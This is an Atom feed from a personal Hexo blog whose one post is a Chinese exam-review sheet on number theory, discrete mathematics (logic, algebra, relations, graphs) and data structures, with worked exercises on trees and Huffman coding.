<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yln&#39;blog</title>
  
  
  <link href="http://www.blog.yln956.top/atom.xml" rel="self"/>
  
  <link href="http://www.blog.yln956.top/"/>
  <updated>2021-01-06T08:54:08.995Z</updated>
  <id>http://www.blog.yln956.top/</id>
  
  <author>
    <name>yln</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>复习</title>
    <link href="http://www.blog.yln956.top/2020/12/26/%E5%A4%8D%E4%B9%A0/"/>
    <id>http://www.blog.yln956.top/2020/12/26/%E5%A4%8D%E4%B9%A0/</id>
    <published>2020-12-25T16:02:52.000Z</published>
    <updated>2021-01-06T08:54:08.995Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信安数学基础（我大哥说有手就行）"><a href="#信安数学基础（我大哥说有手就行）" class="headerlink" title="信安数学基础（我大哥说有手就行）"></a>信安数学基础（我大哥说有手就行）</h1><p><strong>耗子尾汁</strong></p><p>完全剩余系：有n个元素</p><p>简化剩余系：最多n-1个</p><h4 id><a href="#" class="headerlink" title></a><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201227190842638.png" alt="image-20201227190842638" loading="lazy"></h4><p>例如3的简化剩余系：2,4        或       1，5</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201227191913038.png" alt="image-20201227191913038" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106131738797.png" alt="image-20210106131738797" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106135758273.png" alt="image-20210106135758273" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106135815518.png" alt="image-20210106135815518" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106135840612.png" alt="image-20210106135840612" loading="lazy"></p><h1 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h1><p>小道消息，懂得都懂</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210105194524397.png" alt="image-20210105194524397" loading="lazy"></p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>交</p><p>并</p><p>补</p><p>差</p><p>环和</p><p>环积</p><h2 id="数理逻辑"><a href="#数理逻辑" class="headerlink" title="数理逻辑"></a>数理逻辑</h2><h3 id="一些没想好放哪的概念"><a href="#一些没想好放哪的概念" class="headerlink" title="一些没想好放哪的概念"></a>一些没想好放哪的概念</h3><p>重言式（永真）:对应所有指派，命题公式均为真</p><p>矛盾式（永假）:对应所有指派，命题公式均为假</p><p>偶然式:不是永真，也不是永假</p><p>辖域：紧接于量词之后的最小子公式叫量词的辖域</p><p><strong>命题：陈述句</strong>。是或真或假的断言</p><p>​    例如：今天下雨。√      x+y&gt;4 ×</p><p>​    明年十月一日是晴天。√无法确定真假，但也是命题</p><h3 id="运算优先级及它们的真值表"><a href="#运算优先级及它们的真值表" class="headerlink" title="运算优先级及它们的真值表"></a>运算优先级及它们的真值表</h3><p>优先级：┐，∧、∨，→，&lt;-&gt;.</p><p>真值表：挺好记的，∧就是要全部是真才是真、∨有一个为真就是真，→前面真，后面假才是假，&lt;-&gt;就是双向-&gt;记得-&gt;就行了</p><table><thead><tr><th>p</th><th>q</th><th>p∧q</th><th>p∨q</th><th>p-&gt;q</th><th>p&lt;-&gt;q</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>p∧q :p并且q</p><p> p∨q:p或q</p><p> p-&gt;q :如果p，那么q</p><p> p&lt;-&gt;q:p等值于q</p><p>∀：任意</p><p>┐∀：不是所有</p><p>∃：存在</p><p>┐∃：并非存在</p><h3 id="恒等式证明"><a href="#恒等式证明" class="headerlink" title="恒等式证明"></a>恒等式证明</h3><p><strong>1.真值表法</strong>  变元比较少的情况下常用。</p><p><strong>2.等值演算法</strong>.基本恒等式和带入，替换规则。</p><p><strong>3.蕴含法</strong> P&lt;=&gt;Q的充要条件为P=&gt;Q且Q=&gt;P.</p><p><strong>逻辑恒等式、永真蕴含式(书P9 - P10)</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106001807234.png" alt="image-20210106001807234" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210105230707183.png" alt="image-20210105230707183" loading="lazy"></p><p>永真蕴含式</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210105230843232.png" alt="image-20210105230843232" loading="lazy"></p><h3 id="主析取范式，主合取范式"><a href="#主析取范式，主合取范式" class="headerlink" title="主析取范式，主合取范式"></a>主析取范式，主合取范式</h3><p>将合取式称为积，将析取式称为和</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210105235325365.png" alt="image-20210105235325365" loading="lazy"></p><p>利用真值表</p><p>1代表主析取范式</p><p>​    不带非表示1，带非表示0</p><p>0代表主合取范式Π（2，4，6）</p><p>​    带非表示1，不带表示0</p><h3 id="推理规则"><a href="#推理规则" class="headerlink" title="推理规则"></a>推理规则</h3><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106001509361.png" alt="image-20210106001509361" loading="lazy"></p><p><strong>“A(x)对y是自由的”含义</strong></p><p><strong>US：∀xA(x) =&gt; A(x)</strong></p><p><strong>ES（ES在US之前）：∃xA(x) =&gt; A(x)</strong></p><p><strong>EG：A(y) =&gt; ∃xA(x)</strong></p><p><strong>UG：A(x) =&gt; ∀xA(x)</strong></p><h2 id="代数"><a href="#代数" class="headerlink" title="代数"></a>代数</h2><h3 id="代数运算"><a href="#代数运算" class="headerlink" title="代数运算"></a>代数运算</h3><p>封闭性：给定集合S，若对S上的元素进行**<strong><em>运算，产生的象也在S中，则称集合S在**</em></strong>运算下是封闭的。</p><p><strong>二元运算要满足封闭性</strong></p><p>可交换，可结合，可分配</p><p><strong>左右幺元，左右零元</strong></p><p>逆元，与逆元密切相关的一个概念，<strong>可约性</strong>，可约不一定可逆</p><p>​    例：设 * 是集合S上的二元可结合运算，若a∈S是可逆的，则a是可约的。比如：(a <strong><strong>* x=a *</strong></strong> y)V(x <strong><strong>* a=y *</strong></strong> a)=&gt;(x=y)</p><h3 id="同态与同构"><a href="#同态与同构" class="headerlink" title="同态与同构"></a>同态与同构</h3><p>同构：即存在双射</p><p>​    两个代数同构，指它们在结构上完全一致，仅仅是元素与运算符的表示形式不同，运算性质，元素间的总体关系，即本质是一样的。</p><p>同态：</p><p>​    单（一）同态：h为单射（其余和同构相同）</p><p>​    满同态：h为满射（其余和同构相同）</p><p>​    自同态：A=A’（其余和同构相同）</p><p>​    自同构：A=A’，且h是同构，则称h是自同构</p><h3 id="半群，独异点和群"><a href="#半群，独异点和群" class="headerlink" title="半群，独异点和群"></a>半群，独异点和群</h3><p>半群：设V=&lt;S, ***** &gt;是一个代数系统， <strong><strong>* 是一个二元运算，如果 *</strong></strong> 运算是可结合的,即对于 <strong><strong>* a,b,c *</strong></strong> S,有a*(b<em>c)=(a</em>b)*c，则称V为半群。</p><p>​    即满足<strong>封闭性，可结合</strong></p><p>独异点(<strong>含幺半群</strong>)：设V=&lt;S, ***** &gt;是半群，且V中有幺元，则称V是一个含幺半群，也称独异点。为强调幺元存在,有时将它写成&lt;S, ***** ,1&gt;。</p><p>​    即满足<strong>封闭性，可结合，有幺元</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106005914495.png" alt="image-20210106005914495" loading="lazy"></p><p>子半群：设V=&lt;S, ***** &gt;是半群，T <strong><strong>* S，且对于 *</strong></strong> 运算封闭，那么称&lt;T, ***** &gt;是半群&lt;S, ***** &gt;的子半群。</p><p>可交换半群(可交换独异点)：在半群(独异点)中，若运算是可交换的,则称此半群(独异点)为可交换半群(可交换独异点)。</p><p>循环独异点：设&lt;S, ***** ,e&gt;是独异点，若∃xg∈S，对∀xa ***** S,都有一个相应的h∈N使a=g^h。则称此独异点为循环独异点。并称元素g是此循环独异点的生成元。</p><p>群：设&lt;G, ***** &gt;是一个代数系统,二元运算 ***** 满足：<br>    ①满足结合律。②幺元存在。③每个元素都有逆元。<br>    则&lt;G, ***** &gt;称为群。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106012211255.png" alt="image-20210106012211255" loading="lazy"></p><p>有限群（基数称为阶数），无限群</p><p>可交换群</p><p>元素的阶：设&lt;G, ***** &gt;是一个群，且a∈G，如果存在正整数n,使an = e,则称元素a的阶是有限的，满足a^n = e的最小正整数n称为a的<br>阶。</p><p>置换群：记号<strong>⚬</strong>表示<strong>左合成（从右到左）</strong>，例如p1⚬p2，表示先进行p2置换，再进行p1置换</p><p>​              记号<strong>◇</strong>表示<strong>右合成（从右到左）</strong>，例如p1◇p2，表示先进行p1置换，再进行p2置换</p><p>令</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106012650403.png" alt="image-20210106012650403" loading="lazy"></p><p>则左合成</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106012719339.png" alt="image-20210106012719339" loading="lazy"></p><p>令</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106012827134.png" alt="image-20210106012827134" loading="lazy"></p><p>则右合成</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106012730680.png" alt="image-20210106012730680" loading="lazy"></p><h2 id="二元关系"><a href="#二元关系" class="headerlink" title="二元关系"></a>二元关系</h2><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>n元关系,空关系</p><p>设R是A到B的二元关系(即R∈A×B)，称A<br>为R的<strong>前域</strong>,B为R的<strong>陪域</strong>。<br>D(R)={x|∃y(&lt;x,y&gt;属于R)}叫作R的<strong>定义域</strong>(domain)。<br>R(R)={y|∃x(&lt;x,y&gt;∈R)}叫作R的<strong>值域</strong>(range)。</p><p>A上的二元关系R={&lt;x,x&gt;|任意x∈A}称为<strong>相等关系</strong>(恒等关系),记IA或EA</p><p>关系特性：</p><p><strong>自反</strong>：每个结点点都存在自回路，关系图主对角线上元素均为1</p><p><strong>反自反</strong>：每个结点点都<strong>不</strong>存在自回路，关系图主对角线上元素均为0</p><p><strong>对称</strong>：只要有a到b的弧，就有b到a的弧，关系图关于主对角线对称</p><p><strong>反对称</strong>：如果存在a到b的弧，就<strong>不</strong>存在b到a的弧</p><p><strong>传递</strong>：若有a到b和b到c，则必有a到c</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106093803548.png" alt="image-20210106093803548" loading="lazy"></p><h3 id="关系的合成运算"><a href="#关系的合成运算" class="headerlink" title="关系的合成运算"></a>关系的合成运算</h3><p>⑴关系的合成运算一般是不可交换的</p><p>(2)关系的合成运算是可结合的</p><p>(3)关系的合成运算对集合的<strong>并</strong>是可分配的</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106094038342.png" alt="image-20210106094038342" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106094051159.png" alt="image-20210106094051159" loading="lazy"></p><h3 id="关系R的幂"><a href="#关系R的幂" class="headerlink" title="关系R的幂"></a>关系R的幂</h3><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106094202358.png" alt="image-20210106094202358" loading="lazy"></p><p><strong>一个比较重要的定理</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106094236333.png" alt="image-20210106094236333" loading="lazy"></p><h3 id="关系的闭包运算"><a href="#关系的闭包运算" class="headerlink" title="关系的闭包运算"></a>关系的闭包运算</h3><p>逆运算：设R是集合A到B的二元关系,关系R的逆(R的逆关系)是一个B到A上的二元关系</p><p><strong>r(R)：自反闭包；s(R)：对称闭包；t(R)：传递闭包</strong></p><p><strong>闭包就是满足自反(对称,传递)性的一个最小关系</strong></p><p>构成关系R闭包的基本方法：给R补充必要的序偶,使所得的新关系R具有自反(对称,传递)性</p><p>​    简单来说，随便搞</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106094929109.png" alt="image-20210106094929109" loading="lazy"></p><h3 id="次序关系"><a href="#次序关系" class="headerlink" title="次序关系"></a>次序关系</h3><p>偏序：若R具有性质：<strong>自反的，反对称的，传递的</strong>，则称R是A上的一个偏序关系，简称偏序。</p><p><strong>偏序集习惯上用哈斯(Ｈasse)图表示。</strong><br>哈斯图是一种简化的关系图：<br>①略去每个节点的自回路；②能用传递关系得出的边略去；③每条边都是向上画，并将箭头略去。(哈斯图的自反传递闭包就是关系图)</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106095321593.png" alt="image-20210106095321593" loading="lazy"></p><p>假定题目给了个A集合，B∈A，找B集合中的</p><p>最大元素：B集合中找，要和所有元素可比的最大的元素</p><p>最小元素：B集合中找，要和所有元素可比的最小的元素</p><p>极大元素：B集合中找，在最高层的，可以有多个</p><p>极小元素：B集合中找，在最低层的，可以有多个</p><p>上界：A集合找所有大于等于B集合元素的元素，要有可比性</p><p>下界：A集合找所有大于等于B集合元素的元素，要有可比性</p><p>最小上界(lub)：顾名思义</p><p>最大下界(glb)：顾名思义</p><p>拟序：若集合A上的二元关系R是<strong>反自反的,反对称的，传递的,</strong> 则称R是A上的拟序关系,简称拟序</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106100505089.png" alt="image-20210106100505089" loading="lazy"></p><p>线序：偏序关系中每两个元素都可以比较</p><p>良序：线序关系的每一非空子集都有最小元素</p><p>等价关系：如果集合A中的二元关系R是<strong>自反的，对称的，传递的，</strong>则称R是A上的一个等价关系。</p><p>模数等价（模同余）</p><p>划分：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101232291.png" alt="image-20210106101232291" loading="lazy"></p><p>概念真头大，还是例子好理解</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101211995.png" alt="image-20210106101211995" loading="lazy"></p><h2 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h2><p>数据结构都会吧</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101517939.png" alt="image-20210106101517939" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101642562.png" alt="image-20210106101642562" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101701331.png" alt="image-20210106101701331" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101723027.png" alt="image-20210106101723027" loading="lazy"></p><h3 id="正则图"><a href="#正则图" class="headerlink" title="正则图"></a>正则图</h3><p>如果每个结点的度数均为k，则该图称为k-正则图</p><p><strong>10个顶点的3-正则图</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106102030813.png" alt="image-20210106102030813" loading="lazy"></p><h3 id="概念：没错，又是我"><a href="#概念：没错，又是我" class="headerlink" title="概念：没错，又是我"></a>概念：没错，又是我</h3><p>任何图中，度数为奇数的结点必是偶数个。</p><p>子图：边点都能删</p><p>生成子图：只删边</p><p>导出子图：删点</p><p>补图：由G中所有结点和所有能使G成为完全图的添加边组成的图</p><p>图的同构：两图的结点和边分别存在着一一对应，且保持关联关系</p><p>​    同构<strong>必要条件(证明不是同构)</strong>:</p><p>​    (1) 结点数目相等；(2) 边数相等；(3) 度数相同的结点数目相等。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106102747629.png" alt="image-20210106102747629" loading="lazy"></p><h3 id="路径和回路"><a href="#路径和回路" class="headerlink" title="路径和回路"></a>路径和回路</h3><p>简单路径：边不重复的路径</p><p>基本路径：各点出现不超过一次的路径</p><p>简单回路：边不重复的回路</p><p>基本回路：各点出现不超过一次的回路</p><p>强连通，弱连通，最短路径</p><p>欧拉图：一笔画问题，平凡图是欧拉图。</p><p>哈密顿图：每个顶点只经过一次的回路</p><h3 id="二部图"><a href="#二部图" class="headerlink" title="二部图"></a>二部图</h3><p>Km,n：上面m个顶点下面出度为n</p><p>​    <strong>完全匹配，最大匹配</strong></p><p>无向图G作为二部图的充要条件是G中所有回路长度均为偶数。</p><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h3 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h3><p>对于给定的n个元素，可以构造出的逻辑结构有<strong>集合、线性、树、图</strong>四种。</p><p> 一个算法具有5个特性：<strong>_有穷_、_确定_、_可行_、_有0个或多个输入_和_有一个或多个输出_。</strong></p><p>对算法设计的4个要求是<strong><em>正确_、_可读_、_健壮_和_效率与低存储要求</em></strong>。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201226101009754.png" alt="image-20201226101009754" loading="lazy"></p><p>1、对线性表的基本操作有哪些？</p><p>答：</p><p>1、构造空线性表；</p><p>2、销毁线性表；</p><p>3、获取线性表表长；</p><p>4、判断线性表是否空表；</p><p>5、访问线性表中第i个元素；</p><p>6、获取线性表中第1个满足某关系的元素e的位置；</p><p>7、在线性表中第i个元素前（或后）插入新元素；</p><p>8、将线性表中第i个元素删除。</p><h3 id="数组，栈，队列"><a href="#数组，栈，队列" class="headerlink" title="数组，栈，队列"></a>数组，栈，队列</h3><p>8、表达式23+((12<em>3-2)/4+34</em>5/7)+108/9的后缀表达式是<strong><em>23 12 3<em>2-4/34 5</em>7/++108 9 /+</em></strong>。</p><p><strong>画树或者直接写  左根右→左右根</strong></p><p>13、设循环队列用数组A[1..M]表示，队首、队尾指针分别是FRONT和TAIL，判定队满的条件为<strong>_(TAIL+1)%M==FRONT%M_。</strong></p><p>14、设Q[0..N-1]为循环队列，其头、尾指针分别为P和R，则队Q中当前所含元素个数为<strong><em>(R-P+N)%N</em></strong>。</p><p>设数组a[1..50,1..80]的基地址为2000，每个元素占2个存储单元，若以行序为主序顺序存储，则元素a[45,68]的存储地址为___9174__；若以列序为主序顺序存储，则元素a[45,68]的存储地址为___8788__。</p><p><strong>行：（44 * 80 + 67） * 2 + 2000= 9174         列：（67 * 50 +44） * 2 + 2000 = 8788</strong></p><p>18、n阶对称矩阵a满足a[i][j]=a[j][i],i,j=1..n,，用一维数组t[1..m]存储(按行向存储左下三角)时，t的长度为<strong><em>n(n+1)/2</em></strong>， 当</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201226142157850.png" alt="image-20201226142157850" loading="lazy"></p><p>设矩阵A= <img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps4.png" alt="img" loading="lazy"></p><p>（1）若将A视为对称矩阵，画出对其压缩存储的存储表；</p><p>（2）若将A视为稀疏矩阵，画出其三元表形式压缩存储表；</p><p>（3）若将A视为稀疏矩阵，画出A的十字链表结构。</p><p>（1）</p><table><thead><tr><th>2</th><th>0</th><th>0</th><th>0</th><th>3</th><th>0</th><th>4</th><th>0</th><th>0</th><th>0</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>（2）</p><table><thead><tr><th>i</th><th>1</th><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead><tbody><tr><td>j</td><td>1</td><td>4</td><td>3</td><td>2</td><td>1</td></tr><tr><td>v</td><td>2</td><td>4</td><td>3</td><td>3</td><td>4</td></tr></tbody></table><p>（3）</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps6.png" alt="img" loading="lazy"></p><p>24、已知广义表A=(9，7，(8，10，(99))，12)，试用求表头和表尾的操作Head( )和Tail( )将原子元素99从A中取出来。</p><p>答：Head(Head(Tail(Tail(Head(Tail(Tail(A)))))))。</p><p><strong>head取头，返回单个元素(不带括号)，tail取尾（除头取的元素以外的其他元素），返回集合元素（带括号）</strong></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20201226143828172.png" alt="image-20201226143828172" loading="lazy"></p><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><h4 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h4><p>取一块连续的内存空间，在存储每个结点的同时，各自都附加一个记录其父结点位置的变量。</p><p>在树结构中，除了树根外，每个结点都只有一个父结点（又叫“双亲结点”）。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2-1FS015503O53.png" alt="img" loading="lazy"></p><h4 id="孩子表示法（邻接表）"><a href="#孩子表示法（邻接表）" class="headerlink" title="孩子表示法（邻接表）"></a>孩子表示法（邻接表）</h4><p>将树中的每个结点的孩子结点排列成一个线性表，用链表存储起来。对于含有 n 个结点的树来说，就会有 n 个单链表，将 n 个单链表的头指针存储在一个线性表中，这样的表示方法就是孩子表示法。</p><blockquote><p>如果结点没有孩子（例如叶子结点），那么它的单链表为空表。</p></blockquote><p>例如，使用孩子表示法存储图 1 （A），存储效果如图 2：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2-1FS0155F5a9.png" alt="img" loading="lazy"></p><p>图 2 孩子表示法</p><p>使用孩子表示法存储的树结构，正好和双亲表示法相反，适用于查找某结点的孩子结点，不适用于查找其父结点。可以将两种表示方法合二为一，存储效果如图 3：</p><h4 id="孩子兄弟表示法（二叉链）"><a href="#孩子兄弟表示法（二叉链）" class="headerlink" title="孩子兄弟表示法（二叉链）"></a>孩子兄弟表示法（二叉链）</h4><p>使用链式存储结构存储普通树。链表中每个结点由 3 部分组成：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2-1FS0155TD42.png" alt="img" loading="lazy"></p><p>图 4 结点构成</p><p>其中孩子指针域，表示指向当前结点的第一个孩子结点，兄弟结点表示指向当前结点的下一个兄弟结点。</p><p>通过孩子兄弟表示法，普通树转化为了二叉树，所以孩子兄弟表示法又被称为“二叉树表示法”或者“二叉链表表示法”。</p><p>例如，用孩子兄弟表示法表示图 1 （A）的普通树，存储结果为：</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2-1FS0160020200.png" alt="img" loading="lazy"></p><p>1、已知一棵度为3的树有2个度为1的结点，3个度为2的结点，4个度为3的结点，则该树有<strong>__</strong><strong>12</strong>__个叶结点。</p><p><strong>B:边数，N：结点数</strong></p><p><strong>n=b+1    n=n0+n1+n2+n3=n1+2<em>n2+3 <em>n3+1→ n=n2+2 <em>n3+1</em></em>        **3+2</em>4+1</strong></p><p>6、已知一棵二叉树的中序序列是DBEAFIHCG，后序序列是DEBHIFGCA，画出这棵二叉树。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps7.png" alt="img" loading="lazy"></p><p>中缀式a+b<em>3+4</em>(c-d)对应的前缀式为________，若a=1, b=2, c=3, d=4，则后缀式db/cc<em>a-b</em>+的运算结果为________。</p><p>14、设一棵二叉树的前序遍历序列为ABDFCEGH，中序遍历序列为BFDAGEHC</p><p>(1)画出这棵二叉树。</p><p>(2)画出这棵二叉树的后序线索树。</p><p>(3)将这棵二叉树转换成对应的树（或森林)</p><p><strong>线索树先写出序列，无左孩子就指向前驱，无右孩子就指向后继</strong></p><p>FDBGHECA</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps14-1608971064985.png" alt="img" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps15-1608971064986.png" alt="img" loading="lazy">                <img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps16-1608971064986.png" alt="img" loading="lazy"></p><p>15、将下列由三棵树组成的森林转换为二叉树。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps17-1608971064986.png" alt="img" loading="lazy"></p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/wps18-1608971064986.png" alt="img" loading="lazy"></p><h4 id="树转换二叉树"><a href="#树转换二叉树" class="headerlink" title="树转换二叉树"></a><strong>树转换二叉树</strong></h4><p>（1）加线。在所有兄弟结点之间加一条连线。</p><p>（2）去线。树中的每个结点，只保留它与第一个孩子结点的连线，删除它与其它孩子结点之间的连线。</p><p>（3）层次调整。以树的根节点为轴心，将整棵树顺时针旋转一定角度，使之结构层次分明。（注意第一个孩子是结点的左孩子，兄弟转换过来的孩子是结点的右孩子）</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2012110416594150.jpg" alt="img" loading="lazy"></p><p>口诀：兄弟相连，长兄为父，孩子靠左。</p><p>核心：左孩子，右兄弟          </p><h4 id="森林转换二叉树"><a href="#森林转换二叉树" class="headerlink" title="森林转换二叉树"></a>森林转换二叉树</h4><p>（1）把每棵树转换为二叉树。</p><p>（2）第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树的根结点的右子树，用线连接起来。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2012110417004247.jpg" alt="img" loading="lazy"></p><h4 id="二叉树转树"><a href="#二叉树转树" class="headerlink" title="二叉树转树"></a><strong>二叉树转树</strong></h4><p>是树转换为二叉树的逆过程。还原结点A的孩子，结点A的左孩子开始，一直向右走，这些结点就是结点A的孩子，遇见顺序就是它们作为结点A孩子的顺序。</p><p>（1）加线。若某结点X的左孩子结点存在，则将这个左孩子的右孩子结点、右孩子的右孩子结点、右孩子的右孩子的右孩子结点…，都作为结点X的孩子。将结点X与这些右孩子结点用线连接起来。</p><p>（2）去线。删除原二叉树中所有结点与其右孩子结点的连线。</p><p>（3）层次调整。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2012110417011138.jpg" alt="img" loading="lazy"></p><h4 id="二叉树转森林"><a href="#二叉树转森林" class="headerlink" title="二叉树转森林"></a><strong>二叉树转森林</strong></h4><p>假如一棵二叉树的根结点有右孩子，则这棵二叉树能够转换为森林，否则将转换为一棵树。在二叉树种A有右子树上向右的一连串结点都是A的兄弟，那么就把兄弟分离，A的每个兄弟结点作为森林中树的根结点。</p><p>（1）从根结点开始，若右孩子存在，则把与右孩子结点的连线删除。再查看分离后的二叉树，若其根结点的右孩子存在，则连线删除…。直到所有这些根结点与右孩子的连线都删除为止。</p><p>（2）将每棵分离后的二叉树转换为树。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/2012110417014911.jpg" alt="img" loading="lazy"></p><p><strong>哈夫曼树编码，左0右1</strong></p><h4 id="哈夫曼树HT的存储结构的初态和终态"><a href="#哈夫曼树HT的存储结构的初态和终态" class="headerlink" title="哈夫曼树HT的存储结构的初态和终态"></a>哈夫曼树HT的存储结构的初态和终态</h4><p>18、已知下列字符A、B、C、D、E、F、G的权值分别为3、12、7、4、2、8、11，试填写出其对应哈夫曼树HT的存储结构的初态和终态。</p><p>表18-1  HT初态</p><table><thead><tr><th>下标值</th><th>数据域</th><th>weight</th><th>parent</th><th>lchild</th><th>rchild</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>3</td><td>0</td><td>0</td><td>0</td></tr><tr><td>2</td><td>B</td><td>12</td><td>0</td><td>0</td><td>0</td></tr><tr><td>3</td><td>C</td><td>7</td><td>0</td><td>0</td><td>0</td></tr><tr><td>4</td><td>D</td><td>4</td><td>0</td><td>0</td><td>0</td></tr><tr><td>5</td><td>E</td><td>2</td><td>0</td><td>0</td><td>0</td></tr><tr><td>6</td><td>F</td><td>8</td><td>0</td><td>0</td><td>0</td></tr><tr><td>7</td><td>G</td><td>11</td><td>0</td><td>0</td><td>0</td></tr><tr><td>8</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>9</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>10</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>11</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>12</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>13</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p>表18-2  HT终态（书上的结果）</p><table><thead><tr><th>下标值</th><th>数据域</th><th>weight</th><th>parent</th><th>lchild</th><th>rchild</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>3</td><td>8</td><td>0</td><td>0</td></tr><tr><td>2</td><td>B</td><td>12</td><td>12</td><td>0</td><td>0</td></tr><tr><td>3</td><td>C</td><td>7</td><td>10</td><td>0</td><td>0</td></tr><tr><td>4</td><td>D</td><td>4</td><td>9</td><td>0</td><td>0</td></tr><tr><td>5</td><td>E</td><td>2</td><td>8</td><td>0</td><td>0</td></tr><tr><td>6</td><td>F</td><td>8</td><td>10</td><td>0</td><td>0</td></tr><tr><td>7</td><td>G</td><td>11</td><td>11</td><td>0</td><td>0</td></tr><tr><td>8</td><td></td><td>5</td><td>9</td><td>1</td><td>5</td></tr><tr><td>9</td><td></td><td>9</td><td>11</td><td>4</td><td>8</td></tr><tr><td>10</td><td></td><td>15</td><td>12</td><td>3</td><td>6</td></tr><tr><td>11</td><td></td><td>20</td><td>13</td><td>7</td><td>9</td></tr><tr><td>12</td><td></td><td>27</td><td>13</td><td>2</td><td>10</td></tr><tr><td>13</td><td></td><td>47</td><td>0</td><td>11</td><td>12</td></tr></tbody></